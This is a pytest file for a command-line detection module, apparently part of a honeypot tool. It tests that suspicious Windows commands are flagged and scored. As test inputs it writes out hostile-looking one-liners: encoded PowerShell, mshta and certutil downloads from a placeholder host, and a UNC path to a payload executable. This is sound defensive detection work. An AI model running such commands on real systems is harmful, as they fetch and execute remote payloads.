from honeyjam.analysis.heuristics import (
    analyze_command,
    ioc_score,
    is_suspicious,
)
from honeyjam.models import Severity


def test_encoded_powershell_is_high():
    res = analyze_command("powershell.exe -nop -enc SQBFAFgA")
    assert res.suspicious
    assert res.severity == Severity.HIGH
    assert "powershell.encoded" in res.indicators


def test_temp_path_flagged():
    assert is_suspicious(r"C:\Windows\Temp\payload.exe")
    assert is_suspicious(r"%TEMP%\a.exe")


def test_lolbins():
    for cmd in ["mshta http://x/a.hta", "certutil -urlcache -f http://x/a b"]:
        assert is_suspicious(cmd)


def test_unc_path():
    assert is_suspicious(r"\\evil-share\payloads\run.exe")


def test_clean_path_not_suspicious():
    res = analyze_command(r"C:\Program Files\App\app.exe")
    assert not res.suspicious
    assert res.severity == Severity.INFO


def test_empty_input():
    assert not is_suspicious("")
    assert not is_suspicious(None)


def test_ioc_score_bounds_and_reinforcement():
    single = analyze_command("mshta x")
    multi = analyze_command("powershell -enc x ; mshta http://a ; certutil -decode y")
    assert 0 < single.score <= 100
    assert multi.score >= single.score
    assert ioc_score([]) == 0
